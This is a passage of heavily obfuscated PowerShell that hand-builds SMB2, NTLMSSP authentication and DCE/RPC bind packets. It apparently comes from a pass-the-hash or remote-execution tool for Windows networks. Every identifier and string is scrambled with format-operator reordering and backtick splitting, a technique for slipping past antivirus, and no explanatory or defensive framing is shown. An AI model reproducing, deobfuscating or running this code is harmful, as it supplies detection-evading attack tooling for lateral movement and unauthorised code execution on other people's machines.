    ${Pa`CkE`T_sm`B2reAdrEqUE`sT} = &("{2}{1}{0}" -f 'ject','w-Ob','Ne') ("{5}{1}{2}{12}{10}{8}{9}{11}{3}{6}{7}{4}{0}" -f 'nary','te','m','ized.O','tio','Sys','rderedDi','c','peci','a','ollections.S','l','.C')
    ${PAckE`T`_`SMb2`ReA`DrE`quesT}.("{0}{1}" -f'A','dd').Invoke(("{4}{0}{3}{6}{5}{1}{2}" -f 'eq','truct','ureSize','u','SMB2ReadR','_S','est'),[Byte[]](0x31,0x00))
    ${PAcke`T_sm`B2r`ea`DReQUE`st}.("{0}{1}"-f'A','dd').Invoke(("{3}{1}{4}{5}{2}{0}"-f'dding','MB2ReadReques','Pa','S','t','_'),[Byte[]](0x50))
    ${paCK`et`_SmB`2`ReadREQ`Ue`St}.("{0}{1}"-f'A','dd').Invoke(("{5}{2}{4}{0}{3}{1}"-f'uest_','gs','2Re','Fla','adReq','SMB'),[Byte[]](0x00))
    ${Pa`CK`ET`_SmB2rE`AD`R`eQ`UeSt}.("{1}{0}" -f'dd','A').Invoke(("{6}{4}{0}{1}{3}{5}{2}"-f'q','u','gth','es','2ReadRe','t_Len','SMB'),[Byte[]](0x00,0x00,0x10,0x00))
    ${pacKe`T_SMb2`Re`Ad`R`EQUE`ST}.("{0}{1}"-f 'A','dd').Invoke(("{3}{1}{0}{4}{2}" -f '_Offs','t','t','SMB2ReadReques','e'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${PACK`Et`_s`Mb2`READrEQu`e`sT}.("{0}{1}"-f 'Ad','d').Invoke(("{4}{1}{5}{6}{0}{2}{3}" -f 'dReq','M','ues','t_FileID','S','B2','Rea'),${p`ACK`Et_F`iL`e_ID})
    ${PACKet_SMb`2rE`ADRequ`eST}.("{0}{1}" -f'Ad','d').Invoke(("{0}{3}{4}{2}{5}{1}"-f'SM','nt','Req','B2R','ead','uest_MinimumCou'),[Byte[]](0x00,0x00,0x00,0x00))
    ${p`A`ckeT`_S`mB2ReaD`R`EQuEsT}.("{1}{0}"-f'd','Ad').Invoke(("{4}{2}{3}{0}{1}"-f 'ha','nnel','MB2ReadRequest','_C','S'),[Byte[]](0x00,0x00,0x00,0x00))
    ${paC`kET_smB2ReaDrE`qU`e`st}.("{1}{0}" -f'd','Ad').Invoke(("{3}{2}{0}{4}{5}{1}{6}" -f's','ingBy','ReadReque','SMB2','t_Rema','in','tes'),[Byte[]](0x00,0x00,0x00,0x00))
    ${P`ACk`Et_Smb2reAd`R`eqUE`st}.("{0}{1}" -f 'A','dd').Invoke(("{7}{1}{2}{5}{6}{0}{3}{4}" -f 'elInfo','eadReque','st_','Offse','t','Rea','dChann','SMB2R'),[Byte[]](0x00,0x00))
    ${pack`ET_`SmB2r`e`AdREquest}.("{1}{0}" -f 'dd','A').Invoke(("{0}{8}{5}{2}{4}{7}{3}{1}{6}" -f'S','en','n','L','e','han','gth','lInfo','MB2ReadRequest_ReadC'),[Byte[]](0x00,0x00))
    ${pa`Ck`eT_sMb2rEAD`RE`q`UeST}.("{1}{0}" -f 'dd','A').Invoke(("{1}{0}{2}{5}{3}{4}"-f'2Re','SMB','a','est_Bu','ffer','dRequ'),[Byte[]](0x30))

    return ${packet`_smB`2REa`dR`E`qU`Est}
}

function GEt-p`A`ckeTS`M`B2WritE`ReQUe`st()
{
    param([Byte[]]${paCk`E`T_F`I`Le_Id},[Int]${P`ACkeT_RpC_`lEN`gtH})

    [Byte[]]${P`ACKET_wRi`Te_len`G`TH} =   ${8`14}::("{0}{1}{2}"-f 'G','etBy','tes').Invoke(${PACKEt_R`Pc`_`lEnGtH})

    ${paCket_smB2`W`RiTeRe`QUE`st} = &("{0}{2}{1}{3}"-f'Ne','ec','w-Obj','t') ("{5}{7}{3}{6}{0}{2}{1}{4}"-f's.Spec','re','ialized.Orde','o','dDictionary','S','llection','ystem.C')
    ${paCke`T`_S`mb2Wr`i`TE`R`eqUESt}.("{0}{1}" -f'Ad','d').Invoke(("{4}{3}{0}{2}{7}{1}{6}{5}" -f 'es','uct','t','equ','SMB2WriteR','e','ureSiz','_Str'),[Byte[]](0x31,0x00))
    ${P`AC`KEt_Smb2WR`i`TerEqUest}.("{1}{0}" -f 'dd','A').Invoke(("{8}{1}{0}{3}{6}{4}{5}{7}{2}" -f'2W','MB','fset','r','Request_','D','ite','ataOf','S'),[Byte[]](0x70,0x00))
    ${PA`CK`et_`smB`2writER`E`QuEst}.("{1}{0}" -f 'd','Ad').Invoke(("{0}{6}{5}{4}{1}{3}{2}" -f 'S','q','ngth','uest_Le','iteRe','Wr','MB2'),${p`Ac`kET`_w`RIte_`LeNGTh})
    ${PaCK`Et`_S`Mb2wr`ITER`eQ`UEsT}.("{0}{1}"-f'Ad','d').Invoke(("{4}{2}{1}{3}{0}"-f'fset','t_','eReques','Of','SMB2Writ'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${PACK`eT_`SmB2`WrItEr`EqUEsT}.("{0}{1}" -f 'A','dd').Invoke(("{0}{6}{1}{4}{3}{5}{2}"-f 'SMB2Wr','Requ','D','_File','est','I','ite'),${P`Acket_f`iLe_`iD})
    ${PaCKe`T_SMb`2`w`RiT`ErE`quest}.("{0}{1}" -f 'Ad','d').Invoke(("{4}{1}{5}{0}{2}{7}{6}{3}" -f 'eq','i','ue','annel','SMB2Wr','teR','Ch','st_'),[Byte[]](0x00,0x00,0x00,0x00))
    ${Pa`cKEt_smb2Wr`I`T`EREQuest}.("{0}{1}" -f 'A','dd').Invoke(("{1}{4}{5}{2}{7}{0}{6}{3}" -f'gB','S','_Remai','es','MB2WriteReq','uest','yt','nin'),[Byte[]](0x00,0x00,0x00,0x00))
    ${PA`ck`Et_s`MB2wRiTErE`qUEST}.("{1}{0}"-f'd','Ad').Invoke(("{1}{5}{11}{4}{6}{7}{9}{3}{0}{8}{10}{2}" -f'o','S','fset','nelInf','2Write','M','Reques','t_WriteCha','O','n','f','B'),[Byte[]](0x00,0x00))
    ${pAckET`_smb2w`RIt`E`REqUest}.("{0}{1}"-f 'Ad','d').Invoke(("{2}{0}{1}{6}{9}{5}{4}{3}{7}{8}" -f 'B2','WriteReque','SM','teChann','ri','W','s','elI','nfoLength','t_'),[Byte[]](0x00,0x00))
    ${Pa`C`k`E`T`_s`mB2wrITerEquest}.("{1}{0}" -f 'dd','A').Invoke(("{2}{1}{0}{3}{4}" -f '2Write','B','SM','Request_Fla','gs'),[Byte[]](0x00,0x00,0x00,0x00))

    return ${P`Ac`kE`T_s`Mb2W`RiTeR`e`QUeSt}
}

function ge`T-PACketSMB2cl`O`sER`e`qu`EsT()
{
    param ([Byte[]]${paC`kET_F`i`le_`ID})

    ${p`ACkEt_SMb2`C`lose`ReQUESt} = &("{2}{1}{0}"-f'w-Object','e','N') ("{3}{10}{11}{5}{12}{9}{2}{0}{4}{7}{6}{8}{1}"-f '.Specialized.','y','ions','Sys','O','m.','c','rderedDi','tionar','ect','t','e','Coll')
    ${PackET`_smb2`Cl`O`S`eREq`UEst}.("{1}{0}"-f 'd','Ad').Invoke(("{2}{1}{4}{3}{0}{5}" -f'tructu','os','SMB2Cl','st_S','eReque','reSize'),[Byte[]](0x18,0x00))
    ${PackET_SMB2`CL`O`SEReque`ST}.("{1}{0}" -f 'd','Ad').Invoke(("{0}{5}{2}{4}{1}{3}{6}"-f 'S','quest','B2Cl','_Flag','oseRe','M','s'),[Byte[]](0x00,0x00))
    ${PAc`k`et_S`Mb2CLo`SereQueST}.("{1}{0}"-f'dd','A').Invoke(("{6}{2}{1}{4}{5}{0}{3}" -f 'est_R','o','MB2Cl','eserved','seReq','u','S'),[Byte[]](0x00,0x00,0x00,0x00))
    ${paC`kET`_`sMb2CL`OS`erEqu`Est}.("{0}{1}" -f'Ad','d').Invoke(("{4}{2}{3}{1}{0}"-f'equest_FileID','oseR','2C','l','SMB'),${pA`cKe`T_fI`Le_`Id})

    return ${p`A`cket_sM`B2`CLoSeREQUE`st}
}

function g`e`T-`PaCkEt`SmB2Treedi`SconNEC`T`R`eq`UEST()
{
    ${PACkEt_S`m`B`2trE`edIscoNn`EC`TrE`quest} = &("{2}{1}{3}{0}" -f 'ct','b','New-O','je') ("{2}{8}{5}{0}{1}{4}{9}{3}{7}{6}{10}"-f'lect','ions.','Sys','de','Special','Col','edDic','r','tem.','ized.Or','tionary')
    ${paCkET_`Smb`2trEEDiS`Co`N`N`ECtREqUest}.("{1}{0}" -f 'dd','A').Invoke(("{0}{2}{5}{9}{1}{7}{6}{3}{8}{4}"-f 'S','ct','M','_Structur','ize','B','st','Reque','eS','2TreeDisconne'),[Byte[]](0x04,0x00))
    ${PACKeT`_`Smb2T`Reed`I`SC`OnnECtrequE`St}.("{1}{0}" -f'd','Ad').Invoke(("{4}{0}{2}{9}{6}{5}{3}{1}{7}{8}" -f '2T','nn','re','o','SMB','isc','D','ectRequest_Reserve','d','e'),[Byte[]](0x00,0x00))

    return ${PacKet_sm`B`2`TReEDi`sCO`NNe`cTR`EQu`eST}
}

function GET-PA`C`KEtSMB`2SesSIonloGo`Ff`R`EQ`Ue`sT()
{
    ${Pa`C`ket`_s`Mb2SeSSi`oNLoGOffReqU`E`St} = &("{2}{0}{1}"-f'Objec','t','New-') ("{4}{11}{1}{10}{9}{14}{5}{13}{12}{7}{8}{0}{6}{2}{3}"-f'eredDic','tem.Collect','ion','ary','Sy','ec','t','zed.Or','d','n','io','s','i','ial','s.Sp')
    ${p`Ac`KE`T_SMB2sESs`ioN`loGO`FfreQuesT}.("{0}{1}" -f 'Ad','d').Invoke(("{5}{1}{2}{3}{10}{6}{7}{4}{0}{9}{8}"-f'Struct','B2Se','s','sionLo','_','SM','ue','st','eSize','ur','goffReq'),[Byte[]](0x04,0x00))
    ${PaCkEt_s`Mb2`s`E`ss`iOn`LO`goFFreQ`UE`ST}.("{0}{1}" -f'A','dd').Invoke(("{6}{5}{0}{4}{3}{1}{2}" -f'fReq','t_R','eserved','s','ue','f','SMB2SessionLogo'),[Byte[]](0x00,0x00))

    return ${pACkeT`_s`Mb2sess`iON`l`o`gOFFR`e`QuEst}
}



function geT`-pacKetnTL`msspNeG`Ot`i`Ate()
{
    param([Byte[]]${PAcKe`T_neGO`T`i`ATe`_fLa`GS},[Byte[]]${paCk`et_`VErS`i`oN})

    [Byte[]]${PaCket_`Ntl`mss`p`_LEngTh} =  (  &("{3}{1}{2}{0}"-f 'bLE','ET-var','Ia','G') ('81'+'4')).vALuE::("{1}{0}"-f'Bytes','Get').Invoke(32 + ${PaCk`et_vE`RSiON}."l`E`NgTh")
    ${p`ACKe`T_n`TLmss`p_l`En`gtH} = ${PAC`KE`T_ntLMs`SP_LeNgth}[0]
    [Byte[]]${pA`c`kET_aSn_len`GTH`_1} = ${Pa`cK`E`T_nt`LMSS`p_leng`TH}[0] + 32
    [Byte[]]${pa`CKET_As`N`_lEN`gtH_2} = ${PAck`et_NTl`m`Ssp`_lEngTH}[0] + 22
    [Byte[]]${p`A`cket_asN_LE`NGTH_3} = ${Pac`ke`T_Nt`lms`sP_LenG`TH}[0] + 20
    [Byte[]]${P`ACkeT_`A`SN_Len`Gt`H_4} = ${PACK`et`_N`TL`MSsP_Le`NgtH}[0] + 2

    ${p`ACk`E`T`_NTl`msSPnegot`i`AtE} = &("{2}{0}{1}" -f'bje','ct','New-O') ("{7}{5}{0}{6}{1}{4}{2}{3}{8}"-f 'm.Col','s.S','alized.Ord','eredDic','peci','e','lection','Syst','tionary')
    ${p`ACk`et`_ntLM`SSpNEGoTIATE}.("{1}{0}" -f'dd','A').Invoke(("{1}{5}{0}{3}{11}{4}{10}{9}{6}{7}{2}{8}"-f'SSPNegotia','NTL','nI','te_I','ialCo','M','tTo','ke','D','x','nte','nit'),[Byte[]](0x60)) 
    ${Pa`cke`T`_NTl`msSPnEG`OtiatE}.("{0}{1}" -f 'A','dd').Invoke(("{3}{5}{9}{6}{2}{8}{1}{10}{4}{7}{0}" -f'gth','nit','t','NTL','alcontextToken','M','o','Len','iate_I','SSPNeg','i'),${PaCkET`_asn`_`leN`G`Th_1})
    ${PaCK`E`T_n`TLMSsp`NeGO`TiA`Te}.("{0}{1}"-f'A','dd').Invoke(("{1}{4}{5}{0}{3}{2}" -f'iat','NTL','hisMechID','e_T','M','SSPNegot'),[Byte[]](0x06))
    ${P`AcKet_Ntl`m`s`s`pn`eGOtIAtE}.("{0}{1}"-f 'Ad','d').Invoke(("{0}{2}{4}{3}{5}{7}{6}{8}{1}" -f 'NTLM','Length','SSPNeg','a','oti','t','isM','e_Th','ech'),[Byte[]](0x06))
    ${pACKeT`_n`TLM`s`sp`Ne`GotIaTe}.("{1}{0}"-f'dd','A').Invoke(("{3}{0}{2}{4}{1}"-f'Nego','OID','tiate','NTLMSSP','_'),[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))
    ${PA`cKe`T_`N`TlMsSPNe`goTia`Te}.("{1}{0}"-f 'dd','A').Invoke(("{5}{8}{6}{9}{7}{0}{4}{3}{2}{1}"-f'rConte','D','I','Token','xt','NT','MSS','te_Inne','L','PNegotia'),[Byte[]](0xa0))
    ${Pa`ck`et_ntL`m`SSP`NegOtIAte}.("{0}{1}" -f'Ad','d').Invoke(("{7}{3}{6}{4}{1}{5}{8}{9}{0}{2}{10}" -f 'e','ne','nLen','oti','In','rCo','ate_','NTLMSSPNeg','ntex','tTok','gth'),${Pa`ckET_As`N_LeNGTh`_2})
    ${packE`T`_ntLmSs`PnE`gOtiAte}.("{0}{1}" -f 'Ad','d').Invoke(("{1}{3}{0}{4}{10}{6}{2}{9}{5}{8}{7}" -f'S','N','nn','TLM','SPNegotiat','textT','I','enID2','ok','erCon','e_'),[Byte[]](0x30))
    ${PACkEt`_Nt`l`Ms`S`pNeG`oTiaTe}.("{1}{0}" -f 'd','Ad').Invoke(("{6}{5}{3}{4}{7}{1}{2}{0}"-f 'extTokenLength2','_InnerC','ont','Ne','gotiat','TLMSSP','N','e'),${pA`cK`e`T_aSn_lE`Ng`TH_3})
    ${pack`e`T_`NT`Lm`ssPN`EgotIA`TE}.("{0}{1}" -f 'Ad','d').Invoke(("{5}{1}{6}{4}{2}{3}{7}{0}"-f'ID','SS','ate','_Mech','ti','NTLM','PNego','Types'),[Byte[]](0xa0))
    ${PackeT_nt`lMsspn`eGOt`I`ATe}.("{1}{0}" -f'd','Ad').Invoke(("{4}{3}{1}{6}{7}{5}{8}{9}{0}{2}"-f'sL','MS','ength','TL','N','e','SP','Negotiate_M','chTy','pe'),[Byte[]](0x0e))
    ${p`AcKET_Ntl`M`ssP`Neg`Otia`TE}.("{1}{0}"-f 'dd','A').Invoke(("{2}{3}{4}{0}{1}"-f '_MechTy','pesID2','NTL','MSSPNegot','iate'),[Byte[]](0x30))
    ${p`AcKEt_`NTlmSsPNeg`oTIa`Te}.("{0}{1}" -f 'Ad','d').Invoke(("{2}{1}{5}{0}{7}{8}{6}{3}{4}{9}" -f 'SP','TLM','N','sL','eng','S','pe','Negotia','te_MechTy','th2'),[Byte[]](0x0c))
    ${pac`keT`_n`TLmssPNE`gOtiatE}.("{1}{0}"-f'dd','A').Invoke(("{1}{0}{3}{2}{6}{5}{7}{4}"-f 'L','NT','egoti','MSSPN','D3','ech','ate_M','TypesI'),[Byte[]](0x06))
    ${PACkeT`_nT`l`MsS`PNeGo`TiA`TE}.("{1}{0}"-f 'dd','A').Invoke(("{7}{3}{1}{8}{2}{6}{9}{5}{0}{4}{10}" -f't','PNegotiate','ch','TLMSS','h','g','TypesL','N','_Me','en','3'),[Byte[]](0x0a))
    ${pAcKEt_`NtL`Ms`spNEG`O`T`iaTE}.("{0}{1}"-f 'A','dd').Invoke(("{2}{5}{3}{4}{6}{1}{0}"-f 'hType','Mec','NTLMSSPN','t','e','egotia','_'),[Byte[]](0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a))
    ${Pa`CkE`T_nt`L`mssPne`GO`TIa`Te}.("{1}{0}" -f 'd','Ad').Invoke(("{4}{0}{3}{1}{2}"-f 'SSPNegot','chTo','kenID','iate_Me','NTLM'),[Byte[]](0xa2))
    ${P`A`C`KET_Ntl`mSS`Pne`g`OtIaTe}.("{1}{0}"-f'dd','A').Invoke(("{2}{4}{1}{5}{0}{3}"-f'hToke','SSPNegotiate_Me','N','nLength','TLM','c'),${PAck`Et`_a`Sn`_`LeNGtH_4})
    ${p`Ac`ket_NT`lms`sPnEG`OT`I`Ate}.("{0}{1}"-f 'Ad','d').Invoke(("{1}{0}{4}{6}{3}{2}{5}"-f 'T','N','SS','NTLM','L','PID','MSSPNegotiate_'),[Byte[]](0x04))
    ${P`Ack`ET_NtLmss`pNEGO`TIA`TE}.("{1}{0}" -f'd','Ad').Invoke(("{7}{3}{6}{4}{1}{8}{2}{0}{5}{9}"-f'Le','TL','SSP','TLMSSPNegoti','te_N','ngt','a','N','M','h'),${p`A`CkeT_NtlMSSp_`LeN`gtH})
    ${p`Acket_`NTLm`s`SPNeGoTIaTE}.("{1}{0}" -f'd','Ad').Invoke(("{5}{2}{1}{7}{4}{3}{6}{0}"-f'ier','SPNe','TLMS','I','e_','N','dentif','gotiat'),[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
    ${P`AcKet_nT`LM`S`S`PnEGo`TiaTe}.("{1}{0}"-f 'dd','A').Invoke(("{5}{3}{2}{0}{1}{4}{6}" -f 'g','otiate_Mess','SPNe','S','ageT','NTLM','ype'),[Byte[]](0x01,0x00,0x00,0x00))
    ${PacK`et`_NtL`MSSPNeg`otIATe}.("{0}{1}"-f'Ad','d').Invoke(("{5}{4}{2}{0}{6}{3}{1}"-f 'Negotia','gs','P','gotiateFla','SS','NTLM','te_Ne'),${pAcKE`T`_`NEgO`TIA`TE_`FLaGs})
    ${PaCk`ET_N`Tlmssp`Neg`OT`IATE}.("{1}{0}"-f'dd','A').Invoke(("{4}{7}{8}{5}{0}{3}{2}{11}{6}{10}{9}{1}" -f 'PNe','main','otiate_C','g','N','SS','s','TL','M','Do','tation','allingWork'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${p`AcKet_NtL`Mss`pn`e`GOT`iA`TE}.("{0}{1}"-f 'A','dd').Invoke(("{7}{3}{8}{11}{2}{5}{0}{6}{10}{1}{4}{9}" -f 'l','onNa','PNegotiate','T','m','_Ca','l','N','LM','e','ingWorkstati','SS'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    if(${paCk`eT_Ve`R`Sion})
    {
        ${pAC`Ket_`NtLMSsPne`GOTIA`Te}.("{0}{1}" -f 'A','dd').Invoke(("{0}{6}{4}{2}{3}{5}{1}" -f 'NT','n','ot','iate_Ver','g','sio','LMSSPNe'),${P`Ack`eT_`V`ErSion})
    }

    return ${paCkE`T_NTl`mSSp`NEGo`TiaTE}
}

function GEt-p`AC`KeTNT`l`MSS`pA`UTh()
{
    param([Byte[]]${paCK`E`T_`Nt`lm_rESPOnSE})

    [Byte[]]${P`ACKET_nTl`MS`Sp_`lEnGtH} =  ${8`14}::("{1}{0}"-f 'ytes','GetB').Invoke(${PACket_nt`L`M_RE`SPONsE}."L`enGTh")
    ${PaCk`eT`_`NtL`Mssp`_lEngth} = ${PackeT`_N`T`lmssP_LeN`gTh}[1,0]
    [Byte[]]${PAc`Ket`_ASN_l`ENgTH_1} =  ${8`14}::("{0}{2}{1}"-f'GetB','es','yt').Invoke(${pa`cKet_nt`LM`_r`esPo`NSe}."L`enGTH" + 12)
    ${p`Acket_As`N`_lENG`T`H_1} = ${PaCKET`_asN_lEn`G`TH_1}[1,0]
    [Byte[]]${PAc`ke`T_As`N`_`lEngTh_2} =   ${8`14}::("{0}{1}"-f'GetByte','s').Invoke(${paC`kET_nt`lM_`REs`pONSe}."L`eNgTH" + 8)
    ${Pa`CkEt_aS`N`_leNg`Th_2} = ${pAC`Ket`_ASN`_LEnGT`h_2}[1,0]
    [Byte[]]${paCke`T`_as`N_LEN`g`T`h_3} =   ${8`14}::("{1}{0}{2}"-f 'etByt','G','es').Invoke(${pac`KEt_nTLm_r`eS`PONSE}."L`EN`gth" + 4)
    ${Pac`K`ET_`A`Sn`_LEn`gTH_3} = ${pa`cK`e`T_aSN_lENgT`H_3}[1,0]

    ${PAc`K`eT_ntLM`S`sPA`UTH} = &("{1}{3}{2}{0}" -f 'ct','Ne','Obje','w-') ("{9}{2}{13}{11}{4}{3}{12}{5}{10}{1}{7}{6}{0}{8}" -f 'ictio','rder','Collect','.Speciali','s','ed.','dD','e','nary','System.','O','n','z','io')
    ${PAck`e`T_ntL`mSSPaUTH}.("{1}{0}" -f 'dd','A').Invoke(("{0}{1}{3}{2}"-f'NTLMSS','P','NID','Auth_AS'),[Byte[]](0xa1,0x82))
    ${PaC`ket_`NTl`mSSPa`Uth}.("{1}{0}" -f 'dd','A').Invoke(("{1}{0}{2}{3}"-f 'SSPAut','NTLM','h_ASN','Length'),${PACket`_as`N_Le`N`GtH`_1})
    ${p`Acke`T`_NT`LmsSPAu`Th}.("{0}{1}"-f 'Ad','d').Invoke(("{3}{1}{4}{2}{0}"-f'D2','T','MSSPAuth_ASNI','N','L'),[Byte[]](0x30,0x82))
    ${paCKe`T_N`TlMs`spAuth}.("{0}{1}" -f'A','dd').Invoke(("{1}{5}{3}{2}{4}{0}{6}" -f't','N','SN','th_A','Leng','TLMSSPAu','h2'),${PaCK`eT`_a`S`N`_L`ENgTh_2})
    ${p`AcKe`T`_Ntlm`sSpA`UTH}.("{1}{0}"-f'd','Ad').Invoke(("{4}{3}{2}{5}{1}{0}"-f'3','SNID','PAut','TLMSS','N','h_A'),[Byte[]](0xa2,0x82))
    ${PA`C`KE`T`_nTL`MSSpAUtH}.("{0}{1}" -f 'A','dd').Invoke(("{0}{3}{2}{1}"-f 'NTLMS','th3','PAuth_ASNLeng','S'),${P`ACk`eT_aSN_`lE`NGth_3})
    ${P`AcKE`T_NT`Lm`s`spAUTH}.("{1}{0}" -f'dd','A').Invoke(("{0}{3}{2}{4}{5}{1}" -f 'N','ID','LMSS','T','PA','uth_NTLMSSP'),[Byte[]](0x04,0x82))
    ${pAckET`_n`TLmsSpAu`TH}.("{0}{1}"-f 'A','dd').Invoke(("{1}{4}{3}{2}{0}" -f 'th','NTLMSSP','ng','_NTLMSSPLe','Auth'),${PackEt_n`TLMS`S`P_lengTh})
    ${p`A`ckE`T_`NTLmsSPAUTH}.("{1}{0}" -f'd','Ad').Invoke(("{2}{1}{3}{0}{4}"-f'A','TLMSS','N','P','uth_NTLMResponse'),${pA`cKeT`_n`T`LM_respONsE})

    return ${pA`C`KeT_`NTLMss`PAUtH}
}



function G`et-P`Ac`Ke`TrPcBiND()
{
    param([Int]${pA`cKE`T_cAl`l_`iD},[Byte[]]${Pa`CKEt_`max_F`R`AG},[Byte[]]${PA`C`Ket_nuM_`ctx_ITeMS},[Byte[]]${paCkEt_`CoNte`Xt_`Id},[Byte[]]${P`Ac`Ke`T_UUId},[Byte[]]${PAC`ket_`UuId_v`e`RSioN})

    [Byte[]]${pa`c`k`et`_CALL_Id`_BY`Tes} =   (  &("{1}{0}"-f 'ariaBle','v') ('8'+'14') ).VALuE::("{1}{0}{2}" -f 'Byt','Get','es').Invoke(${pAcKe`T_`CaLl_id})

    ${PaCKet`_R`pC`BiNd} = &("{2}{0}{1}" -f'w-Objec','t','Ne') ("{1}{2}{9}{8}{3}{7}{5}{0}{6}{12}{13}{11}{10}{4}" -f'zed','System','.','tions','y','iali','.OrderedDic','.Spec','lec','Col','r','a','t','ion')
    ${packe`T_`RP`CbInD}.("{1}{0}"-f 'd','Ad').Invoke(("{2}{0}{1}{3}" -f 'CBind_','Versio','RP','n'),[Byte[]](0x05))
    ${PAckeT`_`Rp`cbind}.("{1}{0}" -f'd','Ad').Invoke(("{4}{0}{2}{3}{1}"-f'_Ver','or','si','onMin','RPCBind'),[Byte[]](0x00))
    ${paCKET_`RpC`B`Ind}.("{0}{1}"-f'Ad','d').Invoke(("{0}{1}{3}{2}" -f 'RPC','Bind_Pack','Type','et'),[Byte[]](0x0b))
    ${PA`cKe`T_rP`cbiND}.("{0}{1}"-f'A','dd').Invoke(("{1}{4}{3}{5}{2}{0}"-f 'gs','RPCB','tFla','_','ind','Packe'),[Byte[]](0x03))
    ${pAcKe`T_R`p`CBInD}.("{1}{0}" -f'dd','A').Invoke(("{4}{2}{3}{0}{1}{5}"-f'epres','entatio','at','aR','RPCBind_D','n'),[Byte[]](0x10,0x00,0x00,0x00))
    ${PAcKe`T_rpc`Bi`ND}.("{0}{1}" -f'Ad','d').Invoke(("{2}{3}{0}{1}{4}" -f'gLe','n','RPC','Bind_Fra','gth'),[Byte[]](0x48,0x00))
    ${p`Ac`KE`T_r`PCBiNd}.("{0}{1}" -f 'Ad','d').Invoke(("{0}{3}{2}{1}" -f'R','ngth','_AuthLe','PCBind'),[Byte[]](0x00,0x00))
    ${paC`kET`_rPCbI`Nd}.("{1}{0}"-f'dd','A').Invoke(("{0}{2}{1}" -f'R','nd_CallID','PCBi'),${paC`ket`_CALL`_iD`_B`yTeS})
    ${pa`CKEt`_RP`CbinD}.("{0}{1}"-f 'Ad','d').Invoke(("{3}{0}{1}{2}"-f'PCB','i','nd_MaxXmitFrag','R'),[Byte[]](0xb8,0x10))
    ${PaCK`e`T_r`pC`BiND}.("{0}{1}" -f 'Ad','d').Invoke(("{0}{1}{2}{3}" -f 'RPCBind_','MaxR','ecvF','rag'),[Byte[]](0xb8,0x10))
    ${P`Ac`K`E`T_RpcbIND}.("{1}{0}" -f'd','Ad').Invoke(("{3}{1}{2}{0}" -f'ocGroup','Bind','_Ass','RPC'),[Byte[]](0x00,0x00,0x00,0x00))
    ${P`AckET_rP`CBInd}.("{0}{1}"-f 'Ad','d').Invoke(("{2}{0}{3}{1}" -f 'P','umCtxItems','R','CBind_N'),${pA`cKe`T_N`Um`_C`TX_ItEmS})
    ${PAcK`ET_R`PcB`ind}.("{1}{0}"-f 'd','Ad').Invoke(("{3}{1}{2}{4}{0}"-f'known','ind_','U','RPCB','n'),[Byte[]](0x00,0x00,0x00))
    ${PA`cK`ET`_`RpcBiNd}.("{0}{1}"-f'Ad','d').Invoke(("{4}{1}{3}{0}{2}" -f'o','Bind','ntextID','_C','RPC'),${PacK`eT_`coN`T`eX`T_Id})
    ${p`A`ckET`_RPcbi`ND}.("{1}{0}" -f 'd','Ad').Invoke(("{4}{2}{1}{0}{3}"-f 'I','d_NumTrans','n','tems','RPCBi'),[Byte[]](0x01))
    ${PACk`et_Rp`c`B`ind}.("{1}{0}"-f 'd','Ad').Invoke(("{1}{2}{4}{0}{3}"-f'_U','RP','CB','nknown2','ind'),[Byte[]](0x00))
    ${PAc`k`et_`RpCBI`ND}.("{0}{1}"-f 'Ad','d').Invoke(("{3}{1}{2}{0}{4}" -f'fac','d_Inte','r','RPCBin','e'),${pAcK`et_`UuID})
    ${P`Ac`KEt`_`RpcbIND}.("{0}{1}"-f 'Ad','d').Invoke(("{1}{3}{4}{5}{0}{2}"-f 'a','RPCBind_I','ceVer','nte','r','f'),${PAcKet`_UUI`D_VerS`Ion})
    ${PA`CKEt_`RpCBi`Nd}.("{0}{1}" -f'Ad','d').Invoke(("{3}{0}{2}{1}{4}"-f'Inte','rMin','rfaceVe','RPCBind_','or'),[Byte[]](0x00,0x00))
    ${PaCKET`_`Rpc`B`iND}.("{0}{1}"-f 'A','dd').Invoke(("{4}{3}{2}{0}{1}"-f 'rans','ferSyntax','ind_T','CB','RP'),[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))
    ${PaCKet`_`R`P`CBind}.("{0}{1}"-f'A','dd').Invoke(("{0}{4}{1}{3}{2}" -f'R','_Tra','rSyntaxVer','nsfe','PCBind'),[Byte[]](0x02,0x00,0x00,0x00))

    if(${PaCKEt_`N`Um`_CTX_`i`TEMS}[0] -eq 2)
    {
        ${P`Ack`et_`Rp`cbInd}.("{0}{1}" -f'A','dd').Invoke(("{2}{1}{0}{3}" -f 'nd_Contex','CBi','RP','tID2'),[Byte[]](0x01,0x00))
        ${pACK`eT`_rp`c`BINd}.("{0}{1}"-f'A','dd').Invoke(("{5}{6}{0}{3}{1}{4}{2}" -f 'NumT','n','Items2','ra','s','RPCBind','_'),[Byte[]](0x01))
        ${PAC`ke`T`_rP`CbInD}.("{1}{0}" -f'dd','A').Invoke(("{2}{3}{0}{1}{4}" -f 'd_Unk','no','RP','CBin','wn3'),[Byte[]](0x00))
        ${paCket`_r`pCBi`ND}.("{0}{1}"-f'A','dd').Invoke(("{1}{2}{0}{3}" -f'nd_Interfac','RP','CBi','e2'),[Byte[]](0xc4,0xfe,0xfc,0x99,0x60,0x52,0x1b,0x10,0xbb,0xcb,0x00,0xaa,0x00,0x21,0x34,0x7a))
        ${p`A`Cket`_rPcB`INd}.("{0}{1}"-f 'A','dd').Invoke(("{2}{3}{1}{0}{4}" -f 'eVe','ac','RPC','Bind_Interf','r2'),[Byte[]](0x00,0x00))
        ${Pa`C`ke`T_R`PcBinD}.("{1}{0}" -f'd','Ad').Invoke(("{0}{1}{4}{5}{2}{3}" -f 'RP','CBind','nor','2','_In','terfaceVerMi'),[Byte[]](0x00,0x00))
        ${PackE`T_rp`CbI`Nd}.("{1}{0}" -f 'd','Ad').Invoke(("{0}{1}{3}{2}{4}{5}" -f 'RPCBin','d_Tra','y','nsferS','ntax','2'),[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
